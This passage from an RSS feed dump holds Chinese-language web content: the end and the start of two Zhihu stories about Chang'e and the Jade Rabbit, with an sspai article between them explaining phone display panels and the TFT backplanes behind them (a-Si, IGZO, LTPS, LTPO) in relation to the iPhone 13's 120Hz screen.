他。</p>\n<p>这粗狂的声音一点儿没变，我想着。</p>\n<p>「不知小姐在外可有人陪同?如若不嫌弃……」</p>\n<p>「小女正准备赶回家中，就……勿需劳烦了。」</p>\n<p>嫦娥浅浅地笑着，花容月貌，倾国倾城，不过如此。</p>\n<p>叫对面的男子看呆了去。</p>\n<p>等他反应过来后，人已经不见了踪影。</p>\n<p><br></p>\n<p>「天蓬没有魂飞魄散……」</p>\n<p>嫦娥不像刚才那般从容，目光空洞喃喃道，「投胎于人间，也好，也好。」</p>\n<p>我没搭话，自顾自地又咬了一口饼子，只是觉得天蓬记性不错，礼物没白送。</p>\n<p><b>番外·日月</b></p>\n<p>那日与玉帝的交战哥哥虽用的是禺焘的肉身，未像玉帝一样直接陨落，但也受了不小的伤。</p>\n<p>那时我才知道，十万多年的等待，他竟是生出了心魔。</p>\n<p>玉帝不愧是一手建立了天庭，还威胁到我和哥哥的人，一眼就看了出来，还在濒死之际与我做了个无声的交易。</p>\n<p>我和哥哥被迫分离十万多年，我被重伤险些陨落。</p>\n<p>玉帝和王母牺牲了两个儿子，自己也再次投入了轮回，历那每一次都考验着生死的劫数，不知何年何月才会重返天庭。</p>\n<p>他帮哥哥杀死了心魔，条件是我们继续守护人间。</p>\n<p>有些强买强卖，但也算是平衡。</p>\n<p>再者，我发现体内那股陌生的力量就来自人间，对我伤势的恢复大为有益。</p>\n<p>后面查证了一番，哥哥也有。</p>\n<p>虽没搞清楚具体是个什么道理，但心里隐约有了大致的答案。</p>\n<p>既然受了惠，也就勉为其难一下吧。</p>\n<p>就算不能和哥哥像十多万年前那般形影不离，但好歹偶尔能见上一面。</p>\n<p>不知还需要多少年，几万、几十万亦或几百万，才能恢复到当初那个光芒万丈的太阴。</p>\n<p>当下的我还是只能靠哥哥支撑着。</p>\n<p>日月同辉。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/feng-shen-da-ren-49?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">风神大人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484001869/answer/2098788046?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">211 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/360227471?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">嫦娥和玉兔会有什么日常呢？</a><br><a href=\"http://www.zhihu.com/question/35974811?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">后羿能射下9个太阳，为什么老婆背叛他跑到月亮上了，嫦娥不怕被射下来么？后羿为什么不射呢？</a><br>\n","link":"http://www.zhihu.com/question/484001869/answer/2098788046?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"高刷新率「姗姗来迟」，它如何才能让你的新 iPhone 更香？","date":"2021-09-16 06:43:52","description":"\n<p>今年，iPhone Pro 系列的 OLED 屏幕又有了不小的升级，除了高达 1000nit 的屏幕亮度，还支持了不少 Android 旗舰已经支持了的 120Hz 的屏幕刷新率，让不少人直呼「十三香」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drptb34t86tbbuq90.png\"><figcaption>iPhone 13 Pro 系列宣传（图源：Apple）</figcaption></figure><p>但是相信还是有不少人会困惑为什么今年 iPhone 上没有使用新款 iPad Pro 12.9 英寸上的 mini-LED 技术？为什么 OLED 的高刷新率也只有近两年才彻底铺开？以及 iPhone 上的高刷新率到底有什么不同? 这些问题你将能在这篇文章里得到回答。</p>\n<h2>常见的显示面板技术</h2>\n<h3>LCD</h3>\n<p>LCD 是我们身边最常见的显示面板，也有不少的 Apple 产品继续在使用 LCD。它的发光的基础是面板的背光光源，我们可以把背光光源理解为手电筒。当手电筒前放置不同颜色的灯罩便会散发不同颜色的灯光，这个灯罩就是 LCD 的彩色滤光片。当我们在灯罩和手电之间加入不同透明度的薄膜，就可以实现不同亮度的颜色效果。然后通过不同颜色的组合，就可以完成各种色彩的显示了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drq5b34t854sepjig.png\"><figcaption>LCD 就像是手电筒+不同的滤光片</figcaption></figure><h3>mini-LED</h3>\n<p>目前 Apple 只有少数产品采用了 mini-LED 的面板，例如 Apple iPad。mini 的含义在于小间距的 LED，它仍然是以背光源发光作为基础。为了实现小间距的布局，那必定 LED 灯珠本身也需要足够小，目前 LED 灯珠已经做到了50 ~ 100 µm 左右的级别了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drqdb34t86tbbuq9g.png\"><figcaption>miniLED 远比 LCD 小得多</figcaption></figure><p>但使用 mini-LED 依旧不能解决传统 LCD 在纯黑画面下背光漏光的问题，为了减少漏光对显示效果的影响我们需要加入了背光分区的控制技术，这个技术原先用于 LCD 上，但也同样可以用于 mini-LED 上。通过单独调整每个分区 mini-LED 的明亮程度，可以保证在画面需要显示不同的明暗效果时，合理的降低或熄灭区域内的光亮度，这样就能减轻传统整块背光导致的漏光问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drqlb34t854sepjj0.png\"><figcaption>但是控光还是要依赖局部调光区</figcaption></figure><p>mini-LED 最根本的核心便在于大幅增加面板的背光分区，给予了 LED 背光更加完美的画面展示性能。所以由于背光分区的增多，无论是漏光，还是对比度的问题都得到很好的改善；当然就目前而言 mini-LED 的漏光问题还是没有办法完全解决的，还需要等待分区背光技术的改进。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drr5b34t866a7fe10.png\"><figcaption>局部调光还是会有不可避免的光晕区</figcaption></figure><h3>OLED</h3>\n<p>OLED 则是目前 iPhone 和 Apple Watch 产品中最常使用的面板技术，全称是有机发光二极管<sup class=\"ss-footnote\" href=\"\" title=\"organic light-emitting diode，首字母缩写即 OLED\" footnote-id=\"1\">1</sup>，它是一种「自发光」的器件结构，它能靠发光材料<strong>主动散发不同的颜色，</strong>自发光则意味着不会像分区背光一样会出现漏光问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drr5b34t86phi8ma0.png\"><figcaption>OLED 发光方式，有机材料发光层阳极和阴极的中间，紫色是发光方向</figcaption></figure><p>OLED 发光主要依赖于 TFT<sup class=\"ss-footnote\" href=\"\" title=\"Thin Film Transistor 薄膜晶体管\" footnote-id=\"2\">2</sup> 和有机材料发光层。而它的发光原理也并不复杂，和我们化学课上接触过的焰色反应很像。</p>\n<p>焰色反应中受热的金属原子会跃迁到较高的不稳定能级，因为不稳定所以需要释放能量回到稳定的基态，在这过程中会发光<sup class=\"ss-footnote\" href=\"\" title=\"释放光子\" footnote-id=\"3\">3</sup>。</p>\n<p>首先，OLED 通过 TFT 给予发光回路电信号，此时阳极产生空穴（可以简单理解成带正电的电荷），阴极产生电子（电子一定是带负电荷的），空穴和电子需要分别通过各自的传输层，最后会一同抵达有机材料发光层。</p>\n<p>其次，当发光层的电子和空穴到达一定浓度后，会因为引力结合形成激子，同时激发有机发光层的有机分子。</p>\n<p>最后，因为有机分子跃迁到了不稳定的激发态，和焰色反应一样同样需要释放能量回到稳定的基态，并释放出光。</p>\n<p>不难看出整个过程里最基本的两个要素就是，作为开头的 TFT 薄膜晶体管和作为结尾的有机材料发光层了。</p>\n<h2>主流的 TFT 技术</h2>\n<p>因此对于 OLED 来说，TFT 背板是除了发光材料以外，另一个面板显示的关键技术点。</p>\n<p>近年来随着市场对显示效果和能力要求的不断提升，为了满足消费者对刷新率、分辨率以及能耗等多个方面的需求，TFT 技术也不断从结构、材料以及工艺方面寻求突破，不断优化着尺寸、迁移率、漏电以及稳定性等参数。这样一来，才有了我们时常在新闻中听到的一些陌生英文 a-Si、IGZO、LTPS、LTPO 等等，这些便是目前显示领域的常出现 TFT 技术。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drrdb34t866a7fe1g.png\"><figcaption>主流 TFT 技术对比</figcaption></figure><h3>a-Si：简单成熟但不合适</h3>\n<p>a-Si<sup class=\"ss-footnote\" href=\"\" title=\"非晶硅\" footnote-id=\"4\">4</sup> 是曾经显示领域的龙头技术，以往的 TFT-LCD ，也就是 LCD 的背光层几乎均以 a-Si 作为集成电路基底。它是一个比较成熟的方案，因此基于 a-Si 的 TFT 可以在维持高质量产出的同时，成本也相对很低。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drrlb34t86phi8mag.png\"><figcaption>经典的 a-Si TFT LCD 屏幕示意图</figcaption></figure><p>但 a-Si 弊端也比较明显，其电子迁移率约为 <code>0.5 cm^2/Vs</code>，电子迁移率可以简单理解成空穴和电子穿过传输层的效率；而 <code>0.5 cm^2/Vs</code> 单说这一个数值可能大家没有任何概念，可以和目前 OLED 中较为常见的 LTPS 进行对比，LTPS 的电子迁移率约为 <code>100~200cm^2/Vs</code>，比较之下就会发现 a-Si 的电子迁移率小了几百倍。</p>\n<p>电子迁移率从根本上来说决定的是 TFT 器件的响应速度，迁移率越小，空穴和电子传输的速度也就越慢，响应速度自然越慢。这里可以简单打个不太准确的比方，我们可以把电子迁移率比作公路等级，空穴和电子比作汽车，等级越高的公路，在保证安全的前提下车可以开的速度自然也就越快。</p>\n<p>为了保证器件的响应性能让用户可以接受，可以增大晶体管尺寸以提高迁移量，也就是增加车道数可以让同一时间又更多的车开过去。但是这将导致多出来的 TFT 器件会占据了显示区域像素的区域。</p>\n<p>简单来说，单位区域内晶体管占的面积越大，单个像素占有面积越小（像素开口率），导致亮度越低。其次，因为体积无法做小的缘故，导致单位面积的像素个数也受到限制，即为像素密度过小，也就是我们所说的 ppi 过低。</p>\n<p>虽然目前 a-Si 的市场占有率还是可观的，但因技术规格的限制和成本较低，主要是面向大尺寸以及低端手机面板领域。当然，目前仍有企业在尝试有关 a-Si 在 OLED 中的应用研发，例如 Matrix Technologies 近期展示 WOLED 技术<sup class=\"ss-footnote\" href=\"\" title=\"这是一种类似于 LCD 的发光面板，依靠 LED 背光照亮彩色滤光片\" footnote-id=\"5\">5</sup>便采用了 a-Si 作为基底，大幅降低背板成本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drrtb34t86tbbuqa0.png\"><figcaption>WOLED 工作原理其实和 LCD 很像（图片来自 UNIVERSAL DISPLAY）</figcaption></figure><h3>IGZO：性价比高但不足以支撑高刷新率</h3>\n<p>IGZO<sup class=\"ss-footnote\" href=\"\" title=\"铟镓锌氧化物\" footnote-id=\"6\">6</sup> 它首次提出可以追溯到 1985 年，但是首次量产已到了 2012 年（夏普），它的出现提高了 TFT 技术的水平上限。相较于最开始的 a-Si 来说，晶体管的体积大幅缩小，一个 a-Si TFT 的占位至少可以容纳 4 组 IGZO TFT ，虽然减小了器件体积，但是电子迁移率相较于非晶硅来说有显著的提升，约为 <code>25cm^2/Vs</code>，而且在漏电率<sup class=\"ss-footnote\" href=\"\" title=\"LOFF\" footnote-id=\"7\">7</sup>上也是几种 TFT 技术中最为理想的，这样以来在像素无需工作的时候，IGZO 可以最大程度的节省能源损耗。</p>\n<p>上文提到漏电率是指的即使在开关断开的时候，在施加电压后依然会出现较小的电流，简单来说就是出现了意外的电力损耗，在移动设备上会因此导致续航不佳。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drs5b34t866a7fe20.png\"><figcaption>iPad Pro 1 代中的 LCD 背光 TFT 就用了这个材质</figcaption></figure><p>由于 IGZO 在面板布局中的占用面积大幅减少，让发光像素的开口率以及布局区域面积获得了提高，这样以来，就很好的解决 a-Si 的各项弱点，实现了高亮度、高像素密度等等，所以 IGZO 的高分辨率面板产品直到现在也是非常的常见的。除此之外，因为全透明以及良好的弯曲性能，让它不仅可以用在 OLED 面板中，LCD 面板同样适用。</p>\n<p>除此之外，IGZO 的工艺制成并不复杂，可以利用现有非晶硅线体简单改造即可投入运营。从商业角度、良率以及原材料损耗等多个方面综合考虑，IGZO TFT 应该是本文中性价比最高的一个。但 IGZO 也有自己的缺点，对于水氧的敏感度更高，长时间使用下来稳定性来说偏弱一些，从寿命来说没有其他 TFT 好。其次，受到电子迁移率的限制，导致刷新率很难持续提升（当然 IGZO 首席推广者夏普，还是成功的将 IGZO 提升至 120Hz 刷新率，并供货给雷蛇）。</p>\n<h3>LTPS：高刷新率但也更加耗电</h3>\n<p>LTPS<sup class=\"ss-footnote\" href=\"\" title=\"低温多晶硅\" footnote-id=\"8\">8</sup> 是目前市场占有率较大的背板技术，不仅适用于 LCD，对于 OLED 一样适用。这种背板技术的最大优势便在于我们前面所提及的电子迁移率，它的电子迁移率可以高达 <code>200cm^2/Vs</code>，相较于 a-Si 来说，一个是小溪，一个便是大江大河。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drs5b34t86phi8mb0.png\"><figcaption>比起 a-Si，LTPS 天生电子迁移率就很高</figcaption></figure><p>这样看来，OLED 显示的基本要素电流驱动，在 LTPS 的辅助下很简单就可以实现。因为非常可观的电子迁移率，面板非常容易就可以实现的高效的传输效率。这样面板不用再因为驱动的需求，而去扩大晶体管的占有面积，而可以更方便的设计小型器件，并配合大开口率像素。简单来说，LTPS 让像素在面板中的「地位」得到了跨越式的升级。更加直白一点说，面板的显示效果也得到了质的飞跃，在分辨率<sup class=\"ss-footnote\" href=\"\" title=\"像素数量增加\" footnote-id=\"9\">9</sup>和高刷新率<sup class=\"ss-footnote\" href=\"\" title=\"供电速率\" footnote-id=\"10\">10</sup>上迎来了自己的突破。</p>\n<p>但不得不说的是，LTPS 的弊端也是比较明显的。首先，这种器件结构的漏电比较大。前面我们也说了 OLED 的基本要素是电流驱动，电流驱动的稳定性会直接影响画面。为了避免漏电的影响，LTPS 会不断的进行刷新供电，以维持稳定的电位情况。需要持续的刷新，也注定了 LTPS 在低频供电显示的严重短板，以及 LTPS OLED 的刷新率不敢做太高，这些问题也会直接反应在设备的电能损耗上。</p>\n<h2>什么是 LTPO</h2>\n<p>正因为的 LTPS OLED 的高功耗无法支持高频刷新，综合 IGZO 和 LTPS 的特性，便迎来了所谓的 LTPO 背板技术。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drsdb34t86tbbuqag.png\"><figcaption>Apple LTPO 专利</figcaption></figure><h3>1+1＞2 的组合</h3>\n<p>LTPO<sup class=\"ss-footnote\" href=\"\" title=\"低温多晶氧化物\" footnote-id=\"11\">11</sup> 的器件结构综合了 IGZO 和 LTPS 技术，简单一点来形容的话，就是将部分的 LTPS 晶体管（TFT T3/4）管替换为 IGZO 晶体管，这就是 Samsung Display 的经典 LTPO 结构。通过合理利用 IGZO 的低漏电特性，延长了电信号在 TFT 晶体管中的维持时间，进而满足在低频刷新时的信号供给问题，变相解决了 LTPS OLED 的弱点。LTPS TFT 负责高分辨率以及高刷新率，IGZO TFT 负责稳定的低频显示，两者各司其职，但又在背板电路中相辅相成，一同实现了 LTPO TFT 技术。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drslb34t86tbbuqb0.png\"><figcaption>Apple 第一个使用 LTPO 的设备是 Apple Watch S5</figcaption></figure><p>这样以来，在用户使用静态画面或低频需求时，OLED 可以通过驱动来调整部分像素进入低频工作状态，减少了 OLED 对设备电能的损耗。而在游戏以及影音环境中，也可以调整进入高频刷新模式，以满足画面高刷新率的显示需求。</p>\n<h3>不做动态刷新率的 LTPO 未必节能</h3>\n<p>LTPO 作为新型技术来说，最大的优势就在于针对不同显示环境下的针对性控制，既可以保证低频静态画面的稳定输出，又能满足画面高动态需求。</p>\n<p>但需要注意的是，LTPO 的节能并不是绝对的，LTPO 的节能仅体现在变频的使用环境中。 当用户在持续高频刷新率使用的情况下，如果面板采用同等级发光材料并达到相似的亮度，LTPO 的能耗是高于 LTPS 的。这主要源于 LTPO 的电路结构相比 LTPS 要复杂一些，最直观来看 LTPO 比 LTPS 起码多了一组控制驱动<sup class=\"ss-footnote\" href=\"\" title=\"GOA，Gate Driver on Array\" footnote-id=\"12\">12</sup>，因此也会消耗更多的电力。</p>\n<p>为此 Apple 也针对 OLED 设计了 ProMotion 技术，使其可以在 10 fps 到 120 fps 之间自动自动调整，使手机又能享受到高刷的流畅体验也能节省下更多的电力。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c51drstb34t866a7fe2g.png\"><figcaption>Apple 对于 ProMotion 的解释说明（图片来自 Apple）</figcaption></figure><p>一般的事情都是有两面性的，LTPO 的技术因为技术的复杂性，在工业制成上对于各大生产厂商来说都是巨大的挑战。无论是从原材料还是制成工艺来讲，相较于传统 LTPS 生产来有更多的困难点，在不新建生产线的条件下，想要实现 LTPO 的量产供应，并不是一件容易的事情，所以直至目前 LTPO 的主要供应商仍是行业龙头 Samsung Display。</p>\n<h2>未来显示技术可能的方向还有很多</h2>\n<p>其实从上说到下，a-Si 到 LTPO，每一种 TFT 技术其实都前一代技术成果的迭代更新。并没有哪一个晶体管是横空出世的，因为用户需求质量不断的提高，促使技术不断发展创新或是融合，不断探索着显示领域的优质答案。</p>\n<p>就面板现状市场来说，LTPO OLED 一定是一个短期的热点，不仅是刚刚发布的 iPhone 13 系列，对于其他厂商来说，也会是不错的卖点。但是 LTPO 技术并不能说是绝对的未来，因为综合 LTPS 的生产良率以及稳定性来说，LTPS 在接下来的时间中一定仍会占据面板的大量市场。除此之外，mini-LED 以及 micro-LED 技术的不断革新，对传统 OLED 显示技术也是具有一定的冲击性的。</p>\n<p>或许这就是科技的魅力，你永远无法猜测它们究竟是昙花一现，还是恒久流传。我们能做的，只是保持一颗好奇和充满期待的心，迎接科技给大家带来的便利和美好。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，看懂更多新科技 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68831"},{"title":"如何以「我是嫦娥怀里常抱着的玉兔」为开头写一个故事？","date":"2021-09-16 06:42:11","description":"\n<p>（小虐文已完结）</p>\n<p>-1-</p>\n<p>我是嫦娥怀里常抱着的玉兔。</p>\n<p>众仙皆知，天蓬元帅对嫦娥一往情深，可嫦娥连个眼神都懒得给他。然而今天，我怀疑我眼瞎了。</p>\n<p>嫦娥居然靠在了天蓬的怀里，还一脸宠溺。</p>\n<p>幸好我是只兔子，矮矮小小，他们压根注意不到我，我顺利潜伏到了他们的脚下。</p>\n<p>“元帅，求你带我一同去吧。”</p>\n<p>天蓬皱着眉头，可又舍不得推开怀中美人，整个脸热得发烫。</p>\n<p>嫦娥用手抚上他的脸，眼神迷离，“只要你帮我这一次，以后说什么我都听你的。”</p>\n<p>那一抹深情，连我都快要陶醉了，更何况是苦追嫦娥八百年的天蓬。</p>\n<p>但我立马回过神来，狠狠咬了嫦娥的衣角，用力扯她，怎么连这种话都说得出来，万一天蓬说要和她在一起怎么办？这不是把自己卖了吗。</p>\n<p>可出乎我意料的是，天蓬竟然推开了她。</p>\n<p>“他对你就这么重要吗？”</p>\n<p>“是。”</p>\n<p>“即使他完全不记得你了，也没关系吗？”</p>\n<p>“是。”</p>\n<p>“好，我帮你。”</p>\n<p>天啊，这天蓬也算是个痴情种了，男人能有这气度也值得我玉兔敬佩了。</p>\n<p>嫦娥一听天蓬答应了，喜极而泣，一向镇定自若的她，竟然也开始慌乱起来，很久很久，我都没有看到嫦娥笑得如此开怀了。</p>\n<p>“但我法力有限，你最多只能在人间待一年，否则我们都会受到玉帝的惩罚。”</p>\n<p>嫦娥点点头，见我在地上扑腾，把我抱了起来。</p>\n<p>“你把玉兔也带上吧，让它和你做个伴，你一个人在人间，我不放心。”天蓬用力拍了下我的脑袋，“机灵兔，你要好好保护嫦娥，别让她被人欺负了。”</p>\n<p>我似懂非懂地点点头，大概是嫦娥保护我才差不多吧。</p>\n<p>天蓬对着我们念咒语，周围突然亮起一道刺眼的白光，接着是感受到灵魂在飞速地坠落，快到让人失去意识。</p>\n<p>-2-</p>\n<p>“喂，小玉，别睡了，小姐都起来了，你还不快去服侍。”</p>\n<p>我整个人睡得迷迷糊糊，睁开眼的时候，一张蓬头厉齿的脸在我眼前无限放大。</p>\n<p>“啊，鬼啊。”我惊得弹起身子。</p>\n<p>“你个臭丫头，还敢说我是鬼，别以为仗着小姐的宠爱就敢得罪我张妈妈，我在相国府几十年，就连小姐也得给我几分脸面。”</p>\n<p>“是是是，张妈妈我错了。”</p>\n<p>张妈妈狠狠瞪了我一眼。</p>\n<p>等她走后，我才反应过来，她怎么会和一只兔子讲话？我看了看自己的爪子，居然变成了人类的手。</p>\n<p>我玉兔成人精了？</p>\n<p>我慢慢爬向镜子，里面出现了一张小巧精致的脸，圆圆的眼睛衬着秀气的五官，看起来讨巧极了。</p>\n<p>还算天蓬有眼光，给我找了一副漂亮的皮囊，以后说不定还能靠脸吃饭呢。</p>\n<p>那嫦娥姐姐去哪了？</p>\n<p>不管了，先伺候小姐，万一露馅就惨了。</p>\n<p>我端着一盆水战战兢兢地走到小姐的房里，她背对着我，等我帮她梳妆。</p>\n<p>可我哪会这些，平时顶多就用爪子挠一挠嫦娥的头发呀。</p>\n<p>我拿着梳子左右为难，不知道该如何是好，急得额头疯狂冒汗。</p>\n<p>完了完了，我才用了这皮囊不到半个时辰竟然就要穿帮了。</p>\n<p>“噗嗤”，小姐回过头来，瞧我一脸紧张的模样，逗得她捂嘴笑。</p>\n<p>“嫦娥姐姐，居然是你，你成相国府小姐了？”</p>\n<p>“嘘，小点声，这两个人是我特地让天蓬帮我们挑的新身份，怎么样，还喜欢吧。”</p>\n<p>“还行吧，哈哈，只是，为什么偏偏是相国府呢，你弄个公主皇后不是更爽吗？”</p>\n<p>嫦娥微微颔首，脸上略带一丝羞涩，“因为，相国府的小姐，下个月就要嫁给大将军后羿了。”</p>\n<p>后羿？</p>\n<p>我并不认识这个人，只知道在一百年前的中秋佳节，嫦娥一个人拎着几罐桂花酒，在月亮上喝得烂醉。月光如昼，照在她小巧的脸上，没有什么血色，像极了游魂，她嘴里一遍遍地喊着一个名字，“后羿、后羿”，声音又闷又重。</p>\n<p>我不懂什么人间情爱，只知道，后羿应该是对她很重要的人吧，不然怎么宁愿触犯天规也要偷下凡间呢。</p>\n<p>哎，人类的感情真搞不懂。</p>\n<p>-3-</p>\n<p>没过几日，后羿果然来相国府提亲了。</p>\n<p>嫦娥姐姐让我去偷偷瞧一眼，这是我第一次见到嫦娥心心念念的人，他身材修长高大，剑眉英挺，冷傲孤清的样子，散发出一股傲视天地的强势。他命人把聘礼放在地上，毕恭毕敬地向相国公行礼。</p>\n<p>“岳父大人，小婿今日前来求娶府上千金苏素素，还望大人成全。”</p>\n<p>相国公搁下茶，满意地看着他，“后羿，我们苏家是开国功臣，小女也算是京城第一美人了，从今以后，你可要好好待她，当然，老夫也不会亏待你。”</p>\n<p>“那是当然，我会一生待她好。”</p>\n<p>“那个女人，我会向皇上禀明送去西凉国将功补过，老夫希望你明白孰轻孰重。”</p>\n<p>“小婿明白。”</p>\n<p>不知为何，这些再平常不过的话，我怎么从里面闻到了一股硝烟的味道。</p>\n<p>-4-</p>\n<p>正式迎亲那天，我头一回看嫦娥穿红衣。</p>\n<p>真的，美呆了。</p>\n<p>以前觉得白色最适合她，因为她总穿素白的流沙裙，整个人显得清冷高贵。</p>\n<p>没想到红色也如此衬她，逶迤拖地的大红美裙，身披魅红薄纱，长长的头发挽起，仅留下一丝头发，增添了几分妩媚。</p>\n<p>从小姐闺房到大门，几乎所有的仆人都停下了脚步，目不转睛地看着她，她扭头朝大家笑，简直心都要被她融化了，我这才知道，什么叫“回眸一笑百媚生”啊。</p>\n<p>走到相国公府门口，后羿已经在等着了。</p>\n<p>他穿着一身大红直缀新郎服，腰间扎条铜色金丝蛛纹带，俊朗中透着与生俱来的冰冷，让人觉得高不可攀、低至尘埃。</p>\n<p>他见嫦娥出来，伸出手，稳稳地从我手中接过她。</p>\n<p>在扶嫦娥上轿的时候，嫦娥不小心踩到了裙摆，身体突然倾斜倒了下去，幸好后羿一直扶着，她便撞进了那个结实的胸膛。</p>\n<p>我看见后羿把嘴唇凑到嫦娥的耳边，像是在说什么悄悄话，嘴角还勾起了一抹邪魅的笑，仿佛在向所有人宣告他的主权。</p>\n<p>我可真羡慕嫦娥姐姐，终于嫁给了心心念念的男人。</p>\n<p>十里红妆，送亲的马车从街头排到了街尾，井然有序，路旁铺洒着数不尽的玫瑰花，就连满城的树上，都系着无数条红绸带。路旁都是维持秩序的士兵，涌动的人群络绎不绝，一个个都伸长了脑袋，想一睹京城第一美人的风采。</p>\n<p>将军府内张灯结彩，宾客盈门，锣鼓声和喧闹声此起彼伏。</p>\n<p>我扶着嫦娥到新房，在昏暗的房内，绣花的绸缎上，铺着红枣、花生、桂圆、莲子，寓“早生贵子”之意，竟铺成了一圈圈的心形。</p>\n<p>“姐姐你看，将军盼着你早点给他生孩子呢。”</p>\n<p>久久，嫦娥都没有回应我一句。</p>\n<p>直至半夜，后羿终于来了。</p>\n<p>他的脸上明明挂着笑，却让我觉得波云诡谲，深不可测。</p>\n<p>他轻轻挑起头帕，当那张盛世容颜出现在他面前时，他笑了，“我的新娘子长得真美。”</p>\n<p>嫦娥微微抬头，黑色的瞳孔清澈明亮，望着他时因为紧张，显得生机勃勃。</p>\n<p>“可惜是个蛇蝎毒妇。”</p>\n<p>“你以为用你爹的权势拆散了我和清水，我就没办法了吗？既然你这么想当将军夫人，那我成全你，但你也别指望我将来会再踏进这里一步。”</p>\n<p>说罢，他拂袖而去，只留下一抹凌厉的清冷，剜人剖心。</p>\n<p>嫦娥凝重而乌黑的眸，定定地望着后羿离开的方向，喃喃道：“等闲变却故人心，却道故人心易变。”</p>\n<p>-5-</p>\n<p>第二天，是府内所有人来拜见主母的日子。</p>\n<p>我这才知道，原来在迎娶姐姐的同一天，后羿偷偷纳了清水为妾。</p>\n<p>要说这清水，长得也算是漂亮，我在一旁看得真真切切，肤白如雪，红润如花，发黑如黛，难怪把后羿迷得连嫦娥姐姐都看不上。但她那双狭长的丹凤眼，却隐隐藏着让人看不透的心机。</p>\n<p>“姐姐，妹妹来给您敬茶了，昨夜将军歇在了我那，你可别见怪。”</p>\n<p>嫦娥端着茶杯的手抖了一下，温婉精致的眉目沉敛下来，“都是姐妹，这么说就见外了。”</p>\n<p>清水笑笑，扭着腰站了起来。</p>\n<p>不出三日，全府的人都知道了将军新婚之夜宿在了妾侍的房里，给了相国府小姐一个响亮的耳光。</p>\n<p>但消息也仅限于府内，在外人看来，这依然是一桩佳偶天成的美事。</p>\n<p>后来和下人们打听我才知道，原来后羿早已和清水情定终身，但清水是罪臣之妹，苏素素为了嫁给后羿，以帮清水洗清罪名为条件，要求后羿娶她。可后羿不答应，便使计谋逼迫后羿不得不娶。</p>\n<p>听完后羿和苏素素的故事，当真为嫦娥姐姐捏了一把汗，拿了一个这样的剧本，这该怎么破？</p>\n<p>一连三月，后羿从没有来过嫦娥的房里，我心急如焚，每天想着该如何吸引将军的注意力。可嫦娥却当没事似的，每天捧着本书细细翻阅，还劝我：“小玉，我本就不是来争宠的，只是想知道多陪伴他一些时日罢了。”</p>\n<p>“可是姐姐你忘了吗？你只剩下最后8个月的时间了。”</p>\n<p>书随即“砰”一声落下。</p>\n<p>“远远地望着他，也足够了。”</p>\n<p>-6-</p>\n<p>不知相国夫人从哪听来女儿被冷落的消息，急匆匆地赶上门。</p>\n<p>相国夫人也算是个厉害角色，当年若不是她，清水也不会落得罪名，失了当将军夫人的机会。</p>\n<p>“女儿，你这么能被一个妾侍骑在了头上？她怎么能跟你比？”</p>\n<p>“娘，既然她已经是将军的人了，过去的恩恩怨怨，我不想再继续了。”</p>\n<p>“那后羿是怎么回事？听说他已经三个月没有来看过你了，你倒是每天闲得看书，连夫君的心都抓不牢。”</p>\n<p>“你别听其他人瞎说，他对我很好，是不是小玉？”嫦娥推了推我，一个眼神就我把刚刚才编排好的求救话术给憋了回去。</p>\n<p>“是是是，将军常来，对小姐很好。”</p>\n<p>夫人瞟了我一眼，“最近你父亲在朝中屡屡被人弹劾，若是后羿再不把人交出来，地位岌岌可危啊。我最后给你一个月的时候，再抓不住后羿的心，可别怪我给府里添新人了。”</p>\n<p>说罢，扭着屁股走了。</p>\n<p>我小跑着地跟着恭送夫人，隐约听到院外的树林里，传来悉悉嗦嗦的声音。</p>\n<p>晚上，后羿破天荒地来了嫦娥房里。</p>\n<p>他站在门口一动不动，许久，才挤出一句话：“你到底是谁？”</p>\n<p>“苏素素。”</p>\n<p>“苏素素是什么人我很清楚，我要你的真名。”</p>\n<p>“嫦娥。”</p>\n<p>“嫦娥？嫦娥……”后羿嘴里不停地在重复这个名字。</p>\n<p>-7-</p>\n<p>中秋佳节那天，月亮变得越发圆润。</p>\n<p>我和嫦娥坐在凉亭里，